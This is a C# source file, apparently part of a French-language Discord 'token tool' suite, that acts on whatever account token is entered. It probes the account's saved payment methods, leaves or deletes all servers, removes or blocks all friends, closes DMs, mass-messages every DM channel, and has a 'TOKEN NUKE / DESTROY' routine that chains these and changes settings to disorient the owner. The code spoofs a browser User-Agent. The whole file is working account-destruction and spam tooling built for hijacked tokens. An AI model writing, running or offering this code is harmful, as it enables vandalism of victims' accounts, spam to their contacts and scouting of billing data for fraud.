using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using Atom.Utils;

namespace Atom.Services.Tools
{
    public static class TokenAdvancedService
    {
        public static async Task HandlePaymentChecker()
        {
            Console.WriteLine("=== TOKEN PAYMENT CHECKER ===");
            Console.Write("Entrez le Token : ");
            string? token = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(token)) return;

            using var client = new HttpClient();
            client.DefaultRequestHeaders.Add("Authorization", token);

            try
            {
                var response = await client.GetAsync("https://discord.com/api/v10/users/@me/billing/payment-sources");
                if (response.IsSuccessStatusCode)
                {
                    string json = await response.Content.ReadAsStringAsync();
                    using var doc = JsonDocument.Parse(json);
                    int count = doc.RootElement.GetArrayLength();
                    Console.WriteLine($"[+] Méthodes de paiement trouvées : {count}");
                }
                else Console.WriteLine($"[-] Erreur: {response.StatusCode}");
            }
            catch (Exception ex) { Console.WriteLine($"[!] Erreur: {ex.Message}"); }
        }

        public static async Task HandleGuildTools()
        {
            Console.WriteLine("=== TOKEN GUILD TOOLS ===");
            Console.Write("Entrez le Token : ");
            string? token = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(token)) return;

            var options = new System.Collections.Generic.List<string> 
            { 
                "Lister Serveurs", 
                "Quitter tous les serveurs", 
                "Supprimer mes serveurs (Owner)",
                "Retour" 
            };
            int choice = UIHelper.SingleChoice(options);
            Console.Clear();

            using var client = new HttpClient();
            client.DefaultRequestHeaders.Add("Authorization", token);
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36");

            if (choice == 0 || choice == 1 || choice == 2)
            {
                try
                {
                    var response = await client.GetAsync("https://discord.com/api/v10/users/@me/guilds");
                    if (response.IsSuccessStatusCode)
                    {
                        string json = await response.Content.ReadAsStringAsync();
                        using var doc = JsonDocument.Parse(json);
                        var guilds = doc.RootElement.EnumerateArray();
                        
                        if (choice == 0)
                        {
                            foreach (var g in guilds)
                                Console.WriteLine($"- {g.GetProperty("name").GetString()} ({g.GetProperty("id").GetString()})");
                        }
                        else if (choice == 1)
                        {
                            Console.Write("VOULEZ-VOUS VRAIMENT QUITTER TOUS LES SERVEURS ? (o/n): ");
                            if (Console.ReadLine()?.ToLower() != "o") return;

                            foreach (var g in guilds)
                            {
                                if (g.GetProperty("owner").GetBoolean()) continue;
                                string id = g.GetProperty("id").GetString()!;
                                var delResponse = await client.DeleteAsync($"https://discord.com/api/v10/users/@me/guilds/{id}");
                                Console.WriteLine($"[{(delResponse.IsSuccessStatusCode ? "+" : "-")}] Quitté: {g.GetProperty("name").GetString()}");
                                await Task.Delay(500);
                            }
                        }
                        else if (choice == 2)
                        {
                            Console.Write("VOULEZ-VOUS VRAIMENT SUPPRIMER TOUS VOS SERVEURS ? (o/n): ");
                            if (Console.ReadLine()?.ToLower() != "o") return;

                            foreach (var g in guilds)
                            {
                                if (!g.GetProperty("owner").GetBoolean()) continue;
                                string id = g.GetProperty("id").GetString()!;
                                var delResponse = await client.DeleteAsync($"https://discord.com/api/v10/guilds/{id}");
                                Console.WriteLine($"[{(delResponse.IsSuccessStatusCode ? "+" : "-")}] Supprimé: {g.GetProperty("name").GetString()}");
                                await Task.Delay(500);
                            }
                        }
                    }
                }
                catch (Exception ex) { Console.WriteLine($"[!] Erreur: {ex.Message}"); }
            }
        }

        public static async Task HandleFriendTools()
        {
            Console.WriteLine("=== TOKEN FRIEND TOOLS ===");
            Console.Write("Entrez le Token : ");
            string? token = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(token)) return;

            var options = new System.Collections.Generic.List<string> { "Supprimer tous les amis", "Bloquer tous les amis", "Fermer tous les DMs", "Retour" };
            int choice = UIHelper.SingleChoice(options);
            Console.Clear();

            using var client = new HttpClient();
            client.DefaultRequestHeaders.Add("Authorization", token);
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36");

            try
            {
                if (choice == 0 || choice == 1)
                {
                    var response = await client.GetAsync("https://discord.com/api/v10/users/@me/relationships");
                    if (response.IsSuccessStatusCode)
                    {
                        var friends = JsonDocument.Parse(await response.Content.ReadAsStringAsync()).RootElement.EnumerateArray();
                        foreach (var f in friends)
                        {
                            string id = f.GetProperty("id").GetString()!;
                            string name = f.GetProperty("user").GetProperty("username").GetString()!;
                            
                            HttpResponseMessage res;
                            if (choice == 0) res = await client.DeleteAsync($"https://discord.com/api/v10/users/@me/relationships/{id}");
                            else res = await client.PutAsync($"https://discord.com/api/v10/users/@me/relationships/{id}", new StringContent("{\"type\":2}", Encoding.UTF8, "application/json"));
                            
                            Console.WriteLine($"[{(res.IsSuccessStatusCode ? "+" : "-")}] {(choice == 0 ? "Supprimé" : "Bloqué")}: {name}");
                            await Task.Delay(500);
                        }
                    }
                }
                else if (choice == 2)
                {
                    var response = await client.GetAsync("https://discord.com/api/v10/users/@me/channels");
                    if (response.IsSuccessStatusCode)
                    {
                        var channels = JsonDocument.Parse(await response.Content.ReadAsStringAsync()).RootElement.EnumerateArray();
                        foreach (var c in channels)
                        {
                            string id = c.GetProperty("id").GetString()!;
                            var res = await client.DeleteAsync($"https://discord.com/api/v10/channels/{id}");
                            Console.WriteLine($"[{(res.IsSuccessStatusCode ? "+" : "-")}] DM Fermé: {id}");
                            await Task.Delay(500);
                        }
                    }
                }
            }
            catch (Exception ex) { Console.WriteLine($"[!] Erreur: {ex.Message}"); }
        }

        public static async Task HandleMassDM()
        {
            Console.Write("Entrez le Token : ");
            string? token = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(token)) return;

            Console.Write("Message à envoyer : ");
            string? message = Console.ReadLine();
            if (string.IsNullOrEmpty(message)) return;

            using var client = new HttpClient();
            client.DefaultRequestHeaders.Add("Authorization", token);
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36");

            try
            {
                var response = await client.GetAsync("https://discord.com/api/v10/users/@me/channels");
                if (response.IsSuccessStatusCode)
                {
                    var channels = JsonDocument.Parse(await response.Content.ReadAsStringAsync()).RootElement.EnumerateArray();
                    foreach (var c in channels)
                    {
                        string id = c.GetProperty("id").GetString()!;
                        var payload = new { content = message };
                        var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
                        var res = await client.PostAsync($"https://discord.com/api/v10/channels/{id}/messages", content);
                        Console.WriteLine($"[{(res.IsSuccessStatusCode ? "+" : "-")}] Envoyé à DM {id}");
                        await Task.Delay(1000);
                    }
                }
            }
            catch (Exception ex) { Console.WriteLine($"[!] Erreur: {ex.Message}"); }
        }

        public static async Task HandleTokenNuke()
        {
            UIHelper.PrintSectionHeader("TOKEN NUKE / DESTROY");
            Console.Write("Entrez le Token à DÉTRUIRE : ");
            string? token = Console.ReadLine()?.Trim();
            if (string.IsNullOrEmpty(token)) return;

            UIHelper.PrintWarning("CETTE ACTION EST IRRÉVERSIBLE !");
            Console.Write("Tapez 'CONFIRMER' pour continuer : ");
            if (Console.ReadLine() != "CONFIRMER") return;

            UIHelper.PrintInfo("Lancement du protocole de destruction...");
            
            // 1. Quitter/Supprimer serveurs
            await HandleGuildToolsAction(token, true); // Quitter tout
            await HandleGuildToolsAction(token, false); // Supprimer tout (owned)
            
            // 2. Supprimer amis / Bloquer tout
            await HandleFriendToolsAction(token, 0); // Supprimer amis
            await HandleFriendToolsAction(token, 1); // Bloquer tout
            
            // 3. Fermer DMs
            await HandleFriendToolsAction(token, 2);

            // 4. Modifier les paramètres (Langue, Mode sombre, etc. pour désorienter)
            using var client = new HttpClient();
            client.DefaultRequestHeaders.Add("Authorization", token);
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36");
            
            var settings = new { theme = "light", locale = "zh-CN", inline_embed_media = false, render_embeds = false };
            await client.PatchAsync("https://discord.com/api/v10/users/@me/settings", new StringContent(JsonSerializer.Serialize(settings), Encoding.UTF8, "application/json"));

            UIHelper.PrintSuccess("Destruction terminée.");
        }

        private static async Task HandleGuildToolsAction(string token, bool leave)
        {
            using var client = new HttpClient();
            client.DefaultRequestHeaders.Add("Authorization", token);
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36");
            var response = await client.GetAsync("https://discord.com/api/v10/users/@me/guilds");
            if (!response.IsSuccessStatusCode) return;
            var guilds = JsonDocument.Parse(await response.Content.ReadAsStringAsync()).RootElement.EnumerateArray();
            foreach (var g in guilds)
            {
                string id = g.GetProperty("id").GetString()!;
                bool isOwner = g.GetProperty("owner").GetBoolean();
                if (leave && !isOwner) await client.DeleteAsync($"https://discord.com/api/v10/users/@me/guilds/{id}");
                if (!leave && isOwner) await client.DeleteAsync($"https://discord.com/api/v10/guilds/{id}");
                await Task.Delay(300);
            }
        }

        private static async Task HandleFriendToolsAction(string token, int action)
        {
            using var client = new HttpClient();
            client.DefaultRequestHeaders.Add("Authorization", token);
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36");
            if (action == 0 || action == 1)
            {
                var response = await client.GetAsync("https://discord.com/api/v10/users/@me/relationships");
                if (!response.IsSuccessStatusCode) return;
                var friends = JsonDocument.Parse(await response.Content.ReadAsStringAsync()).RootElement.EnumerateArray();
                foreach (var f in friends)
                {
                    string id = f.GetProperty("id").GetString()!;
                    if (action == 0) await client.DeleteAsync($"https://discord.com/api/v10/users/@me/relationships/{id}");
                    else await client.PutAsync($"https://discord.com/api/v10/users/@me/relationships/{id}", new StringContent("{\"type\":2}", Encoding.UTF8, "application/json"));
                    await Task.Delay(300);
                }
            }
            else if (action == 2)
            {
                var response = await client.GetAsync("https://discord.com/api/v10/users/@me/channels");
                if (!response.IsSuccessStatusCode) return;
                var channels = JsonDocument.Parse(await response.Content.ReadAsStringAsync()).RootElement.EnumerateArray();
                foreach (var c in channels)
                {
                    await client.DeleteAsync($"https://discord.com/api/v10/channels/{c.GetProperty("id").GetString()!}");
                    await Task.Delay(300);
                }
            }
        }
    }
}
